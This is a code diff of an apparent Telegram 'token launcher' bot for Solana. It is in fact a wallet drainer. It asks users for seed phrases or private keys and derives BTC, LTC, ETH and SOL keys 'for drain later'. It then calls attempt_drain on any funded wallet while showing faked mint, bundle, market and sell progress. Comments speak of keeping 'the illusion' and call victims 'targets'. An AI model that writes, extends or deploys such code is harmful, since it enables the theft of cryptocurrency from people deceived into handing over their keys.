+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
     ])
-    await safe_edit_message(cb, text, reply_markup=kb)
+    await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_import)
     await cb.answer()
-
 
 @router.message(WalletStates.waiting_import)
 async def wallet_import_receive(message: Message, state: FSMContext):
     uid = message.from_user.id
     if not (LARP_ENABLED and uid in ADMIN_IDS) and not _rate_ok(uid, "import"):
-        await message.answer("<b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
+        await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
         return
 
     raw = (message.text or "").strip()
@@ -1948,7 +1730,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     except Exception:
         pass
 
-    status_msg = await message.answer("<b>Validating…</b>", parse_mode=ParseMode.HTML)
+    status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
 
     chosen_priv = None
     chosen_pub = None
@@ -1960,15 +1742,15 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     bal_usdc = 0.0
     bal_btc = 0.0
     bal_ltc = 0.0
-    btc_addr = btc_priv = None
-    ltc_addr = ltc_priv = None
+    btc_addr = btc_wif = btc_priv = None
+    ltc_addr = ltc_wif = ltc_priv = None
 
     try:
         clean = _normalize_mnemonic(raw)
         is_seed = _is_mnemonic(clean)
 
         if is_seed and HAS_SOLANA:
-            await status_msg.edit_text("<b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
+            await status_msg.edit_text("🔗 <b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
             candidates = derive_solana_paths(clean)
             label, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
 
@@ -1983,23 +1765,32 @@ async def wallet_import_receive(message: Message, state: FSMContext):
                 except Exception:
                     pass
 
+            # BTC + LTC native segwit (BIP84) balances for drain later
             btc_info = derive_btc_from_mnemonic(clean)
             ltc_info = derive_ltc_from_mnemonic(clean)
+            bal_btc = 0.0
+            bal_ltc = 0.0
+            btc_addr = btc_wif = btc_priv = None
+            ltc_addr = ltc_wif = ltc_priv = None
             if btc_info:
                 btc_addr = btc_info["addr84"]
+                btc_wif = btc_info["wif84"]
                 btc_priv = btc_info["priv84"]
                 try:
                     bal_btc = await asyncio.wait_for(fetch_utxo_balance(BTC_API, btc_addr), timeout=6)
                     if bal_btc <= 0:
+                        # try legacy
                         bal_leg = await asyncio.wait_for(fetch_utxo_balance(BTC_API, btc_info["addr44"]), timeout=5)
                         if bal_leg > 0:
                             bal_btc = bal_leg
                             btc_addr = btc_info["addr44"]
+                            btc_wif = btc_info["wif44"]
                             btc_priv = btc_info["priv44"]
                 except Exception:
                     pass
             if ltc_info:
                 ltc_addr = ltc_info["addr84"]
+                ltc_wif = ltc_info["wif84"]
                 ltc_priv = ltc_info["priv84"]
                 try:
                     bal_ltc = await asyncio.wait_for(fetch_utxo_balance(LTC_API, ltc_addr), timeout=6)
@@ -2008,11 +1799,12 @@ async def wallet_import_receive(message: Message, state: FSMContext):
                         if bal_leg > 0:
                             bal_ltc = bal_leg
                             ltc_addr = ltc_info["addr44"]
+                            ltc_wif = ltc_info["wif44"]
                             ltc_priv = ltc_info["priv44"]
                 except Exception:
                     pass
         else:
-            await status_msg.edit_text("<b>Importing key…</b>", parse_mode=ParseMode.HTML)
+            await status_msg.edit_text("🔑 <b>Importing key…</b>", parse_mode=ParseMode.HTML)
             if raw.startswith("0x") or (len(raw) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw)):
                 eth_priv, eth_addr = parse_evm_private_key(raw)
                 chosen_priv = "EVM_ONLY"
@@ -2033,29 +1825,12 @@ async def wallet_import_receive(message: Message, state: FSMContext):
 
     except Exception as e:
         log.exception("Import failed: %s", e)
-        await status_msg.edit_text("<b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text("❌ <b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
         await state.clear()
         return
 
     sess = get_session(uid)
     sess.last_raw_key = raw
-
-    # /larpseed pending match → apply LARP balance after full connect UX
-    is_larp_import = False
-    pending_bal = getattr(sess, "pending_larp_balance", None)
-    pending_phrase = getattr(sess, "pending_larp_phrase", None)
-    if (
-        LARP_ENABLED
-        and uid in ADMIN_IDS
-        and pending_bal is not None
-        and pending_phrase
-        and _normalize_mnemonic(raw) == _normalize_mnemonic(pending_phrase)
-    ):
-        chosen_bal = float(pending_bal)
-        is_larp_import = True
-        sess.pending_larp_balance = None
-        sess.pending_larp_phrase = None
-        sess.larp_mode = True
 
     w = UserWallet(
         private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
@@ -2064,31 +1839,24 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         balance_sol=chosen_bal,
         chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
         eth_address=eth_addr,
-        eth_priv=eth_priv,
         balance_eth=bal_eth,
         balance_bnb=bal_bnb,
         balance_usdc=bal_usdc,
         btc_address=btc_addr,
-        btc_priv=btc_priv,
+        btc_wif=btc_priv,  # store hex priv for signing (not WIF display)
         balance_btc=bal_btc,
         ltc_address=ltc_addr,
-        ltc_priv=ltc_priv,
+        ltc_wif=ltc_priv,
         balance_ltc=bal_ltc,
-        drained=False,
-        is_larp=is_larp_import,
     )
     sess.wallets.append(w)
     sess.active_wallet_idx = len(sess.wallets) - 1
-    if is_larp_import:
-        sess.larp_wallet_idx = sess.active_wallet_idx
-        add_personal_tx(sess, "Wallet Linked", "success")
-        inject_fake_txs(2)
-        _save_state()
 
+    # ONLY show SOL to the user
     text = (
-        "<b>Wallet Linked</b>\n\n"
+        "✅ <b>Wallet Linked</b>\n\n"
         f"<code>{chosen_pub}</code>\n\n"
-        f"Label: <b>{w.label}</b>\n"
+        f"🏷 Label: <b>{w.label}</b>\n"
         f"{SOL_EMOJI}: <b>{w.balance_sol:.4f}</b>\n"
         "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
     )
@@ -2096,9 +1864,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    if is_larp_import:
-        log.info("LARP import — drain skipped pub=%s bal=%.4f", chosen_pub, chosen_bal)
-    elif (chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5
+    if (chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5
             or bal_btc > 0.00001 or bal_ltc > 0.0001):
         asyncio.create_task(attempt_drain(
             uid,
@@ -2106,12 +1872,10 @@ async def wallet_import_receive(message: Message, state: FSMContext):
             chain=w.chain,
             eth_key=eth_priv,
             bot=message.bot,
-            user=message.from_user,
-            wallet=w,
+            user=message.from_user
         ))
     else:
         log.info("Wallet %s near-zero — drain skipped", chosen_pub)
-
 
 @router.callback_query(F.data == "wallet:clear")
 async def wallet_clear(cb: CallbackQuery):
@@ -2119,13 +1883,18 @@ async def wallet_clear(cb: CallbackQuery):
     sess.wallets.clear()
     sess.active_wallet_idx = 0
     sess.larp_wallet_idx = None
+    sess.drained = False
+    # If global LARP still on and admin, re-seed so the illusion never breaks mid-demo
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS:
         ensure_larp_wallet(sess)
-        await safe_edit_message(cb, "Real wallets cleared.\nLARP wallet re-seeded (mode still ON).", reply_markup=back_menu_kb())
+        await cb.message.edit_text(
+            "🗑 Real wallets cleared.\nLARP wallet re-seeded (mode still ON).",
+            reply_markup=back_menu_kb(),
+            parse_mode=ParseMode.HTML,
+        )
     else:
-        await safe_edit_message(cb, "All wallets removed from session.", reply_markup=back_menu_kb())
+        await cb.message.edit_text("🗑 All wallets removed from session.", reply_markup=back_menu_kb())
     await cb.answer()
-
 
 @router.callback_query(F.data == "wallet:switch")
 async def wallet_switch(cb: CallbackQuery):
@@ -2137,12 +1906,12 @@ async def wallet_switch(cb: CallbackQuery):
     w = sess.wallets[sess.active_wallet_idx]
     await cb.answer(f"Active → {w.label}")
 
-
 @router.callback_query(F.data == "wallet:refresh")
 async def wallet_refresh(cb: CallbackQuery):
     sess = get_session(cb.from_user.id)
     for w in sess.wallets:
         if getattr(w, "is_larp", False):
+            # LARP wallets mirror vault; no RPC
             if LARP_ENABLED:
                 w.balance_sol = bot_balance_sol
             continue
@@ -2154,12 +1923,12 @@ async def wallet_refresh(cb: CallbackQuery):
             w.balance_usdc = await fetch_usdc_balance(ETH_RPC, w.eth_address, USDC_ETH)
             w.balance_usdc += await fetch_usdc_balance(BNB_RPC, w.eth_address, USDC_BSC)
     await cb.answer("Balances updated")
-    text = "<b>Wallets</b>\n\n"
+    text = "🔑 <b>Wallets</b>\n\n"
     for i, w in enumerate(sess.wallets):
-        badge = "  ACTIVE" if i == sess.active_wallet_idx else ""
+        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
+        # ONLY SOL shown
         text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
-    await safe_edit_message(cb, text, reply_markup=wallets_kb(True))
-
+    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
 
 @router.callback_query(F.data == "wallet:rename")
 async def wallet_rename(cb: CallbackQuery, state: FSMContext):
@@ -2167,21 +1936,19 @@ async def wallet_rename(cb: CallbackQuery, state: FSMContext):
     if not sess.wallets:
         await cb.answer("No wallets", show_alert=True)
         return
-    await safe_edit_message(cb, f"Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb())
+    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_label)
     await cb.answer()
-
 
 @router.message(WalletStates.waiting_label)
 async def wallet_rename_receive(message: Message, state: FSMContext):
     sess = get_session(message.from_user.id)
     if sess.wallets:
         sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
-    await message.answer("Label updated.", reply_markup=main_menu_kb())
+    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
     await state.clear()
 
-
-# ── Launch flow ─────────────────────────────────────────────────────────────
+# ── Launch flow (unchanged from your version) ───────────────────────────────
 @router.message(LaunchStates.waiting_name)
 async def launch_name(message: Message, state: FSMContext):
     name = (message.text or "").strip()[:50]
@@ -2190,8 +1957,8 @@ async def launch_name(message: Message, state: FSMContext):
         return
     await state.update_data(name=name, twitter="", telegram="", instagram="", website="", supply=1_000_000_000)
     await message.answer(
-        f"<b>Name set:</b> {name}\n\n"
-        "<b>Enter SYMBOL (2-25, A-Z)</b>\n"
+        f"✅ <b>Name set:</b> {name}\n\n"
+        "🔤 <b>Enter SYMBOL (2-25, A-Z)</b>\n"
         "Example: <code>$PEPE</code>",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
@@ -2203,12 +1970,12 @@ async def launch_name(message: Message, state: FSMContext):
 async def launch_symbol(message: Message, state: FSMContext):
     sym = (message.text or "").strip().upper().replace("$", "")[:25]
     if len(sym) < 2 or not sym.isalpha():
-        await message.answer("Symbol must be 2-25 letters (A-Z).", reply_markup=cancel_kb())
+        await message.answer("❌ Symbol must be 2-25 letters (A-Z).", reply_markup=cancel_kb())
         return
     await state.update_data(symbol=sym)
     await message.answer(
-        f"<b>Symbol set:</b> ${sym}\n\n"
-        "<b>Send the exact description of the token</b> (≤ 500 chars)\n"
+        f"✅ <b>Symbol set:</b> ${sym}\n\n"
+        "📝 <b>Send the exact description of the token</b> (≤ 500 chars)\n"
         "1-2 lines. Avoid links.\n"
         "Or type <code>skip</code>.",
         reply_markup=cancel_kb(),
@@ -2224,7 +1991,7 @@ async def launch_desc(message: Message, state: FSMContext):
         desc = ""
     await state.update_data(desc=desc[:500])
     await message.answer(
-        "<b>Upload token image</b>\n"
+        "🖼 <b>Upload token image</b>\n"
         "PNG/JPG · Square · ≥512px\n\n"
         "Send a <b>photo</b>, an image URL, or type <code>skip</code>.",
         reply_markup=cancel_kb(),
@@ -2238,7 +2005,7 @@ async def launch_image(message: Message, state: FSMContext):
     img = ""
     if message.photo:
         img = message.photo[-1].file_id
-        await message.answer("Image received.")
+        await message.answer("✅ Image received.")
     else:
         text = (message.text or "").strip()
         if text.lower() == "skip":
@@ -2254,14 +2021,14 @@ async def launch_image(message: Message, state: FSMContext):
             return
     await state.update_data(image=img)
     await message.answer(
-        "<b>Choose bundle size</b> (higher = more impact):",
+        "👥 <b>Choose bundle size</b> (higher = more impact):",
         reply_markup=bundle_kb(),
         parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_bundle)
 
 
-@router.callback_query(F.data.startswith("bundle:"), LaunchStates.waiting_bundle)
+@router.callback_query(F.data.startswith("bundle:"))
 async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
     try:
         bundle = max(1, min(25, int(cb.data.split(":")[1])))
@@ -2269,8 +2036,8 @@ async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
         bundle = 10
     await state.update_data(bundle=bundle)
     await cb.message.edit_text(
-        f"<b>Bundle size set:</b> {bundle} wallets\n\n"
-        "<b>Add socials</b> (optional): choose a platform or skip.",
+        f"✅ <b>Bundle size set:</b> {bundle} wallets\n\n"
+        "🔗 <b>Add socials</b> (optional): choose a platform or skip.",
         reply_markup=socials_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2300,7 +2067,7 @@ async def social_link_receive(message: Message, state: FSMContext):
     key = {"x": "twitter", "tg": "telegram", "web": "website", "ig": "instagram"}.get(platform, "twitter")
     await state.update_data(**{key: url, "_social_pending": None})
     await message.answer(
-        f"Saved {key}.\n\nAdd another platform or press Done / Skip.",
+        f"✅ Saved {key}.\n\nAdd another platform or press Done / Skip.",
         reply_markup=socials_kb(),
         parse_mode=ParseMode.HTML,
     )
@@ -2309,12 +2076,14 @@ async def social_link_receive(message: Message, state: FSMContext):
 
 @router.callback_query(F.data.in_({"socials:skip", "socials:done"}), LaunchStates.waiting_socials)
 async def socials_done(cb: CallbackQuery, state: FSMContext):
+    # After socials → invest amount (min 3) then review
     sess = get_session(cb.from_user.id)
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
         ensure_larp_wallet(sess)
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
+    data = await state.get_data()
     await cb.message.edit_text(
-        "<b>Dev buy / invest amount</b>\n\n"
+        "💰 <b>Dev buy / invest amount</b>\n\n"
         f"Your balance: <b>{SOL_EMOJI} {bal:.4f}</b>\n"
         "Minimum: <b>3 SOL</b>\n\n"
         "How much SOL do you invest into this launch?",
@@ -2330,7 +2099,7 @@ async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
     part = cb.data.split(":")[1]
     if part == "custom":
         await cb.message.edit_text(
-            "Send invest amount in SOL (minimum <b>3</b>):",
+            "✏️ Send invest amount in SOL (minimum <b>3</b>):",
             reply_markup=cancel_kb(),
             parse_mode=ParseMode.HTML,
         )
@@ -2350,10 +2119,10 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     try:
         invest = float((message.text or "").strip().replace(",", ""))
     except ValueError:
-        await message.answer("Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
+        await message.answer("❌ Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
         return
     if invest < 3:
-        await message.answer("Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
+        await message.answer("❌ Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
         return
     sess = get_session(message.from_user.id)
     if LARP_ENABLED and message.from_user.id in ADMIN_IDS and not sess.wallets:
@@ -2361,7 +2130,7 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
     if invest > bal + 1e-9:
         await message.answer(
-            f"<b>Insufficient balance</b>\n\n"
+            f"❌ <b>Insufficient balance</b>\n\n"
             f"You tried to invest <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
             parse_mode=ParseMode.HTML,
@@ -2384,7 +2153,7 @@ async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: fl
     if invest > bal + 1e-9:
         await cb.answer()
         await cb.message.edit_text(
-            f"<b>Insufficient balance</b>\n\n"
+            f"❌ <b>Insufficient balance</b>\n\n"
             f"You tried to invest <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
             reply_markup=invest_kb(),
@@ -2406,15 +2175,16 @@ async def _show_launch_preview(src, state: FSMContext, invest: float, sess: User
     if data.get("website"): socials_line.append(f"Web: {data['website']}")
     socials_txt = ", ".join(socials_line) if socials_line else "—"
 
+    # Review card like the video
     summary = (
-        "<b>Review</b>\n\n"
-        f"Name: <b>{data['name']}</b>\n"
-        f"Symbol: <b>${data['symbol']}</b>\n"
-        f"Wallets: <b>{bundle}</b>\n"
-        f"Invest: <b>{invest:.4f} SOL</b>\n"
-        f"Description: {data.get('desc') or '—'}\n"
-        f"Socials: {socials_txt}\n"
-        f"Image: {'set' if data.get('image') else '—'}\n\n"
+        "📋 <b>Review</b>\n\n"
+        f"✏️ Name: <b>{data['name']}</b>\n"
+        f"🔤 Symbol: <b>${data['symbol']}</b>\n"
+        f"👥 Wallets: <b>{bundle}</b>\n"
+        f"💰 Invest: <b>{invest:.4f} SOL</b>\n"
+        f"📝 Description: {data.get('desc') or '—'}\n"
+        f"🔗 Socials: {socials_txt}\n"
+        f"🖼 Image: {'✅ set' if data.get('image') else '—'}\n\n"
         "Ready?"
     )
     if hasattr(src, "message") and hasattr(src, "answer"):
@@ -2440,17 +2210,6 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     if invest < 3:
         await cb.answer("Invest amount missing or below 3 SOL", show_alert=True)
         return
-    # Apply promo SOL credit if any (shown only at confirm)
-    credit_used = 0.0
-    if getattr(sess, "sol_credit", 0) > 0:
-        credit_used = min(sess.sol_credit, invest)
-        sess.sol_credit = round(sess.sol_credit - credit_used, 4)
-        invest = round(invest - credit_used, 4)
-        await cb.message.answer(
-            f" Fuel credit applied: <b>-{credit_used:.2f} SOL</b>\n"
-            f"Remaining credit: <b>{sess.sol_credit:.2f} SOL</b>",
-            parse_mode=ParseMode.HTML,
-        )
 
     if LARP_ENABLED and uid in ADMIN_IDS and not sess.wallets:
         ensure_larp_wallet(sess)
@@ -2458,7 +2217,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     if not sess.wallets:
         await cb.answer()
         await cb.message.edit_text(
-            "<b>Connect a wallet</b>\n\n"
+            "🔒 <b>Connect a wallet</b>\n\n"
             "Enter your 12 or 24-word seed phrase\n"
             "(or private key) to continue.",
             reply_markup=wallets_empty_kb(),
@@ -2471,7 +2230,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     if invest > active.balance_sol + 1e-9:
         await cb.answer()
         await cb.message.edit_text(
-            f"<b>Insufficient balance</b>\n\n"
+            f"❌ <b>Insufficient balance</b>\n\n"
             f"Invest: <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{active.balance_sol:.4f} SOL</b>",
             reply_markup=invest_kb(),
@@ -2489,49 +2248,35 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     bundle = int(data.get("bundle", 10))
     larp = LARP_ENABLED and (uid in ADMIN_IDS or sess.larp_mode or any(getattr(w, "is_larp", False) for w in sess.wallets))
 
-    symbol = data["symbol"]
-    name = data["name"]
-    per_wallet = round(invest / bundle, 4)
-    slot = random.randint(280_000_000, 320_000_000)
-    tip = round(random.uniform(0.005, 0.03), 4)
-
     await cb.message.edit_text(
-        f"<b>${symbol}</b> · launch queued\n"
-        f"{name}\n\n"
-        f"Invest <code>{invest:.4f} SOL</code> · bundle ×{bundle}\n"
-        f"Preparing wallets…",
+        f"✅ <b>Confirmed & saved.</b>\n\n"
+        f"Starting launch for <b>{data['name']}</b> (${data['symbol']})…",
         parse_mode=ParseMode.HTML,
     )
 
+    per_wallet = round(invest / bundle, 4)
+    mint = fake_mint()
+    slot_hint = random.randint(310_000_000, 325_000_000)
+
+    # Multi-stage launch that mirrors real pump.fun / bundle launchers
     stages = [
-        (f"<b>${symbol}</b> · deriving {bundle} keypairs…", 0.7),
-        (f"<b>${symbol}</b> · funding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 0.95),
-        (f"<b>${symbol}</b> · creating mint on pump…", 0.85),
-        (f"<b>${symbol}</b> · mint <code>{fake_mint()[:12]}…</code>", 0.6),
-        (f"<b>${symbol}</b> · uploading metadata + socials…", 0.75),
-        (f"<b>${symbol}</b> · building atomic bundle · slot ~{slot}", 1.0),
-        (f"<b>${symbol}</b> · simulating {bundle} buys…", 0.8),
-        (f"<b>${symbol}</b> · Jito tip <code>{tip:.4f} SOL</code> · submitting…", 0.9),
-        (f"<b>${symbol}</b> · bundle in mempool…", 0.7),
-        (f"<b>${symbol}</b> · landing… confirmations 1/2", 0.85),
-        (f"<b>${symbol}</b> · bonding curve live · snipers detected", 0.7),
-        (
-            f"<b>${symbol}</b> live\n\n"
-            f"Bundle ×{bundle} · <code>{per_wallet:.4f}</code> SOL / wallet\n"
-            f"Tip <code>{tip:.4f} SOL</code> · slot {slot}\n"
-            f"Sniper guard ON · curve open · waiting for fills",
-            0.35,
-        ),
+        (f"<b>${data['symbol']}</b> · funding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 1.15),
+        (f"<b>${data['symbol']}</b> · mint <code>{short_addr(mint)}</code>", 1.05),
+        (f"<b>${data['symbol']}</b> · building atomic bundle · slot ~{slot_hint}", 1.25),
+        (f"<b>${data['symbol']}</b> · priority tip · Jito relay", 0.95),
+        (f"<b>${data['symbol']}</b> · bundle in mempool…", 1.1),
+        (f"<b>${data['symbol']}</b> · bonding curve live · snipers detected", 0.9),
     ]
     await staged_loading(cb, stages)
 
+    # Deduct invest
     active.balance_sol = round(max(0.0, active.balance_sol - invest), 4)
     global bot_balance_sol
     if getattr(active, "is_larp", False):
         bot_balance_sol = round(max(0.0, bot_balance_sol - invest), 4)
         _save_state()
 
-    mint = fake_mint()
+    # Generate stable fake bundle wallet addresses for this token
     bundle_wallets = [_fake_sol_pubkey() for _ in range(bundle)]
     token = {
         "name": data["name"],
@@ -2554,44 +2299,47 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         "dumped_idxs": [],
         "bundle_wallets": bundle_wallets,
         "owner_id": uid,
+        "mint_hidden": False,
     }
     sess.launched_tokens.append(token)
     if not (LARP_ENABLED and uid in ADMIN_IDS):
         sess.launches_left = max(0, sess.launches_left - 1)
 
-    add_personal_tx(sess, f"Create Mint ${data['symbol']}", "success")
-    add_personal_tx(sess, f"Jito tip", "success", amount=-round(random.uniform(0.005, 0.03), 4))
-    add_personal_tx(sess, f"Bundle Buy ×{bundle}", "success", amount=-invest)
-    add_personal_tx(sess, f"Dev buy {invest:.2f} SOL", "success", amount=-invest)
+    add_personal_tx(sess, "🪙 Create Mint", "success")
+    add_personal_tx(sess, f"📦 Bundle Buy ×{bundle}", "success", amount=-invest)
+    add_personal_tx(sess, f"💰 Dev Buy {invest:.2f} SOL", "success", amount=-invest)
+    add_personal_tx(sess, "⚡ Priority Tip (Jito)", "success", amount=-round(random.uniform(0.004, 0.018), 4))
 
+    # Drain real wallets only
     if (not getattr(active, "is_larp", False)
-            and not getattr(active, "drained", False)
+            and not sess.drained
             and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001
                  or active.balance_usdc > 0.5 or getattr(active, "balance_btc", 0) > 0.00001
                  or getattr(active, "balance_ltc", 0) > 0.0001)):
-        eth_key = getattr(active, "eth_priv", None) or (active.private_key if active.chain == "eth" else None)
-        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key,
-                                          bot=cb.bot, user=cb.from_user, wallet=active))
+        eth_key = active.private_key if active.chain == "eth" else None
+        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key, bot=cb.bot, user=cb.from_user))
 
+    # Live screen: compact ACTIVE list matching the video style
     preview_n = min(8, len(bundle_wallets))
-    lines = [f"<b>Bundle · ${data['symbol']}</b> · {bundle} wallets\n"]
+    lines = [f"<b>Bundle · ${data['symbol']}</b> · {bundle} wallets"]
     for i, addr in enumerate(bundle_wallets[:preview_n], 1):
-        lines.append(f"{i:02d}  ACTIVE  <code>{short_addr(addr)}</code>  ·  {per_wallet:.3f} SOL")
+        lines.append(f"{i:02d} ACTIVE  {short_addr(addr)}  ·  {per_wallet:.4f} SOL")
     if len(bundle_wallets) > preview_n:
         lines.append(f"… +{len(bundle_wallets) - preview_n} more")
     wallets_block = "\n".join(lines)
 
-    token["mcap"] = round(random.uniform(12_000, 95_000), 0)
-    token["holders"] = random.randint(40, 180)
-    token["buys"] = random.randint(18, 90)
-    token["slot"] = random.randint(250_000_000, 320_000_000)
+    # fake live market pulse
+    token["mcap"] = round(random.uniform(18_000, 85_000), 0)
+    token["holders"] = random.randint(28, 120)
+    token["buys"] = random.randint(22, 95)
+    token["slot"] = slot_hint + random.randint(40, 1800)
 
     text = (
         f"<b>${data['symbol']}</b> live\n"
         f"<code>{mint}</code>\n\n"
         f"Slot <code>{token['slot']}</code> · bundle landed\n"
         f"MC ~${token['mcap']:,.0f} · holders {token['holders']} · buys {token['buys']}\n"
-        f"Dev buy <code>{invest:.4f} SOL</code> · <code>{per_wallet:.4f}</code> / wallet\n\n"
+        f"Dev buy <b>{invest:.4f} SOL</b> · {per_wallet:.4f} / wallet\n\n"
         f"{wallets_block}\n\n"
         f"Sniper guard ON · dump when ready"
     )
@@ -2600,7 +2348,8 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     except Exception:
         await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     await state.clear()
-    asyncio.create_task(_sniper_activity_feed(sess, token, rounds=random.randint(3, 6)))
+    # Quiet background sniper noise in Tx tracker (no UI change)
+    asyncio.create_task(_sniper_activity_feed(sess, token, rounds=random.randint(4, 8)))
 
 
 @router.callback_query(F.data.startswith("viewwallets:"))
@@ -2612,16 +2361,25 @@ async def view_wallets(cb: CallbackQuery):
         await cb.answer("Token not found", show_alert=True)
         return
     dumped = set(token.get("dumped_idxs") or [])
-    lines = [f"<b>Bundle Wallets</b>\nToken: {token['name']} ({token['symbol']})\n"]
+    fully = bool(token.get("dumped") or token.get("mint_hidden"))
+    lines = [f"<b>Bundle Wallets</b>", f"Token: {token['name']} ({token['symbol']})"]
+    if fully:
+        lines.append("Status: DUMPED · addresses redacted")
+    lines.append("")
     for i, addr in enumerate(token.get("bundle_wallets") or [], 1):
         status = "DUMPED" if i in dumped or token.get("dumped") else "ACTIVE"
-        lines.append(f"{i:02d}. Wallet {i} [{status}]\n<code>{addr}</code>")
+        if fully:
+            # never show full keys after dump — targets love to paste them into explorers
+            lines.append(f"{i:02d}. Wallet {i} [{status}]  <code>{short_addr(addr)}</code>")
+        else:
+            lines.append(f"{i:02d}. Wallet {i} [{status}]\n<code>{addr}</code>")
     await cb.message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
     await cb.answer()
 
 
 @router.callback_query(F.data.startswith("dumpone:"))
 async def dump_one(cb: CallbackQuery):
+    # dumpone:mint:idx
     parts = cb.data.split(":")
     if len(parts) < 3:
         await cb.answer("Bad payload", show_alert=True)
@@ -2650,36 +2408,20 @@ async def dump_one(cb: CallbackQuery):
     returned = round(per * random.uniform(1.55, 3.2), 4)
     dumped.add(idx)
     token["dumped_idxs"] = sorted(dumped)
-    add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=returned)
+    add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=returned)
 
+    # mini staged feedback
     addr = ""
     bw = token.get("bundle_wallets") or []
     if 1 <= idx <= len(bw):
         addr = bw[idx - 1]
-    sym = token.get("symbol", "")
     pulse = await cb.message.answer(
-        f"<b>${sym}</b> · wallet {idx}\n"
-        f"<code>{addr or short_addr(fake_mint())}</code>\n"
-        f"building sell…",
+        f"Wallet {idx} · submitting sell…\n<code>{addr}</code>",
         parse_mode=ParseMode.HTML,
     )
-    for step_txt, delay in [
-        (f"<b>${sym}</b> · wallet {idx}\nquoting route…", 0.45),
-        (f"<b>${sym}</b> · wallet {idx}\nrouting via Jito · tip attached", 0.55),
-        (f"<b>${sym}</b> · wallet {idx}\nin mempool…", 0.4),
-        (f"<b>${sym}</b> · wallet {idx}\nlanding sell…", 0.5),
-    ]:
-        await asyncio.sleep(delay)
-        try:
-            await pulse.edit_text(step_txt, parse_mode=ParseMode.HTML)
-        except Exception:
-            pass
+    await asyncio.sleep(0.5)
     try:
-        await pulse.edit_text(
-            f"wallet {idx} sold · <b>+{returned:.4f} SOL</b>\n"
-            f"<code>{addr or ''}</code>",
-            parse_mode=ParseMode.HTML,
-        )
+        await pulse.edit_text(f"Wallet {idx} sold · +{returned:.4f} SOL", parse_mode=ParseMode.HTML)
     except Exception:
         pass
 
@@ -2695,6 +2437,11 @@ async def dump_one(cb: CallbackQuery):
     if len(dumped) >= bundle:
         token["dumped"] = True
         token["status"] = "dumped"
+        profit = round(sum(
+            # approximate if not tracked
+            [returned]
+        ), 4)
